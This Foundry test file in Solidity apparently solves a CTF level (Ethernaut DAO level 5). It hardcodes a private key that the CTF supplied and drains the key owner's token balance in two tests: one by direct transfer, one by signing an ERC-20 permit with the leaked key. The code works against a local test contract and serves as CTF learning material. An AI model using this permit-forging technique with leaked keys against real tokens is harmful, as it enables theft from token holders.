// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernautDao/level5/EthernautDaoToken.sol";

contract DaoTokenTest is Test {
    EthernautDaoToken public daoToken;
    address public alice;
    address public bob;

    // private key of address that received the initial 3 mints was given as part of ctf
    uint256 public key =
        uint256(
            0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
        );

    function setUp() public {
        daoToken = new EthernautDaoToken();
        // retrieve address from private key
        alice = vm.addr(key);

        bob = vm.addr(1);

        // initial mints to address of private key
        daoToken.mint(alice, 1 wei);
        daoToken.mint(alice, 99999999999999999 wei);
        daoToken.mint(alice, 999999999999999999 wei);
    }

    // using address directly
    function testAttack1() public {
        uint256 aliceBalance = daoToken.balanceOf(alice);

        // call transfer directly with private key
        vm.prank(alice);
        daoToken.transfer(bob, aliceBalance);

        assertEq(daoToken.balanceOf(bob), aliceBalance);
    }

    // using erc20 permit
    function testAttack2() public {
        uint256 deadline = block.timestamp + 1;
        uint256 aliceBalance = daoToken.balanceOf(alice);

        // Reconstruct the EAO signed message to be used by the `permit` function
        bytes32 permitTypeHash = keccak256(
            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
        );

        // encode permit function parameters
        bytes32 permitStructHash = keccak256(
            abi.encode(permitTypeHash, alice, bob, aliceBalance, 0, deadline)
        );

        bytes32 permitHash = ECDSA.toTypedDataHash(
            daoToken.DOMAIN_SEPARATOR(),
            permitStructHash
        );

        // sign message with private key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, permitHash);

        daoToken.permit(alice, bob, aliceBalance, deadline, v, r, s);

        vm.prank(bob);
        daoToken.transferFrom(alice, bob, aliceBalance);

        assertEq(daoToken.balanceOf(bob), aliceBalance);
    }
}
